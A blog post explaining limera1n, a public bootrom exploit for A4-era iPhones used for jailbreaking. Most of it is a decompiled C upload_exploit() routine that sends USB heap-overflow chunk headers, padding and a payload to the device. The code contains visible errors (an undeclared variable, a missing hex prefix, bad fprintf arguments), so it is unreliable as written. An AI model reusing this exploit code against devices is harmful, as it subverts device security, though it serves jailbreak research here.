---
layout: post
title: "What is limera1n?"
description: "Devices with the limera1n vulnerability are the most fun devices to play with."
category: articles
tags: [limera1n, iphone 4, info]
image:
  feature: "limera1npaper.png"
---

## limera1n
limera1n is a bootrom exploit found by `geohot` that works on all A4 and below devices. The last devices being the iPhone 4 GSM (1,1)(1,3) and the iPhone 4 CDMA (3,3). It is the last public bootrom exploit to be released to this day. A bootrom exploit is an exploit that can be run on a device with any iOS version. Basically meaning the device can be jailbroken for life. The reason I am talking about limera1n is because it will be mentioned often in my posts. I like to mess around with this exploit a lot and find out all of the cool stuff I can do with it. It has been made into a tethered jailbreak ([Mac](https://sites.google.com/site/dayt0nsfiles/downloads/limera1nOSX.zip?attredirects=0&d=1), [Windows](https://sites.google.com/site/dayt0nsfiles/downloads/limera1nWIN.exe.zip?attredirects=0&d=1)) by geohot which you can untether using the `0x24000 Segment Overflow` exploit or the `Packet Filter Kernel Exploit`. 


## Code Executed
{% highlight c %}
signed int __cdecl upload_exploit() {
int device_type;
signed int payload_address;
int free_address;
int deviceerror;
char *chunk_headers_ptr;
unsigned int sent_counter;
//int v6;
signed int result; 
//signed int v8;
int recv_error_code;
signed int payload_address2;
signed int padding_size;
char payload;
char chunk_headers;
//int v14;
//v14 = *MK_FP(__GS__, 20);
device_type = *(_DWORD *)(device + 16);

if ( device_type == 8930 ) {
padding_size = 0x2A800;
payload_address = 0x8402B001;
free_address = 0x8403BF9C;
} else {
payload_address = 0x84023001;
padding_size = 0x22800;
// free_address = (((device_type == 8920) – 1) & 0xFFFFFFF4) – 0x7BFCC05C;
if(device_type == 8920) free_address = 0x84033FA4;
else free_address = 84033F98;
}

memset(&payload, 0, 0x800);
memcpy(&payload, exploit, 0x230);

if (libpois0n_debug) {
//v8 = payload_address;
fprintf(stderr, 1, "Resetting device counters\n");
//payload_address = v8;
}

payload_address2 = payload_address;
deviceerror = irecv_reset_counters(client);

if ( deviceerror ) {
irecv_strerror(deviceerror);
fprintf(stderr, 1, &aCannotFindS[12]);
result = -1;
} else {
memset(&chunk_headers, 0xCC, 0x800);
chunk_headers_ptr = &chunk_headers;

do {
*(_DWORD *)chunk_headers_ptr = 1029;       
*((_DWORD *)chunk_headers_ptr + 1) = 257;
*((_DWORD *)chunk_headers_ptr + 2) = payload_address2;  
*((_DWORD *)chunk_headers_ptr + 3) = free_address;
chunk_headers_ptr += 64;
} while ((int *)chunk_headers_ptr != &v14);

if (libpois0n_debug)
fprintf(stderr, 1, "Sending chunk headers\n");

sent_counter = 0;
irecv_control_transfer(client, 0x21, 1, 0, 0, &chunk_headers, 0x800);
memset(&chunk_headers, 0xCC, 0x800);

do {
sent_counter += 0x800;
irecv_control_transfer(client, 0x21, 1, 0, 0, &chunk_headers, 0x800);
} while (sent_counter < padding_size);

if (libpois0n_debug)
fprintf(stderr, 1, "Sending exploit payload\n");

irecv_control_transfer(client, 0x21, 1, 0, 0, &payload, 0x800);

if (libpois0n_debug)
fprintf(stderr, 1, "Sending fake data\n");

memset(&chunk_headers, 0xBB, 0x800);
irecv_control_transfer(client, 0xA1, 1, 0, 0, &chunk_headers, 0x800);
irecv_control_transfer(client, 0x21, 1, 0, 0, &chunk_headers, 0x800);

if (libpois0n_debug)
fprintf(stderr, 1, "Executing exploit\n");

irecv_control_transfer(client, 0x21, 2, 0, 0, &chunk_headers, 0);
irecv_reset(client);
irecv_finish_transfer(client);

if (libpois0n_debug) {
fprintf(stderr, 1, "Exploit sent\n");
if (libpois0n_debug)
fprintf(stderr, 1, "Reconnecting to device\n");
}

client = (void *)irecv_reconnect(client, 2);

if (client) {
result = 0;
} else {
if (libpois0n_debug) {
recv_error_code = irecv_strerror(0);
fprintf(stderr, 1, &aCannotFindS[12], recv_error_code);
}
fprintf(stderr, 1, "Unable to reconnect\n");
result = -1;
}
}

// compiler stack check
//if (*MK_FP(__GS__, 20) != v14)
//    __stack_chk_fail(v6, *MK_FP(__GS__, 20) ^ v14);

return result;
}
{% endhighlight %}

## limera1n For Newer Devices
As of now there are no public bootrom exploits for any newer devices. [iH8sn0w](https://twitter.com/iH8sn0w/) has found a bootrom exploit for A5 and A5X devices, but has not shared it publicly. He has not done this because he says that with just a bit of tweaking he can make it work on newer devices (A5+). If he were to release it anytime soon, Apple is in a position to release a newer model of a device without any problem, effectivly patching it on half of the devices the bootrom exploit would work on.

<center><h3>-dayt0n</h3></center>
